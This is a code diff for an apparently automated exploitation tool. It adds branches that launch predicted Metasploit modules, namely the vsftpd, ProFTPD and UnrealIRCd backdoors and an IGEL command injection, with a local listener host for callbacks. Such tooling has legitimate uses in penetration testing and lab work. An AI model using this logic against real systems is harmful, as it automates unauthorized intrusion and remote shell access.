@@ -105,6 +105,15 @@ class Soviet(predict.Predict):
         if self.predicted == 'None':
             print(f"{Color.BLUE}[+] {Color.WHITE}Exploit Used => {self.predicted}")
             sys.exit(23)
+        elif self.predicted == 'exploit/unix/ftp/vsftpd_234_backdoor':
+            print(f"{Color.BLUE}[+] {Color.WHITE}Exploit Used => {self.predicted}")
+            command.ftp(self.predicted, self.user)
+        elif self.predicted == "exploit/unix/ftp/proftpd_133c_backdoor" or self.predicted == "exploit/unix/irc/unreal_ircd_3281_backdoor":
+            print(f"{Color.BLUE}[+] {Color.WHITE}Exploit Used => {self.predicted}")
+            command.other(self.predicted, self.user, self.lhost()[0])
+        elif self.predicted == "exploit/linux/misc/igel_command_injection":
+            print(f"{Color.BLUE}[+] {Color.WHITE}Exploit Used => {self.predicted}")
+            command.igel(self.predicted, self.user, self.lhost()[0], self.lhost()[0])
         else:
             print(f"{Color.BLUE}[+] {Color.WHITE}Exploit Used => {self.predicted}")
             command.metasploit(self.predicted, self.user, self.lhost()[0])
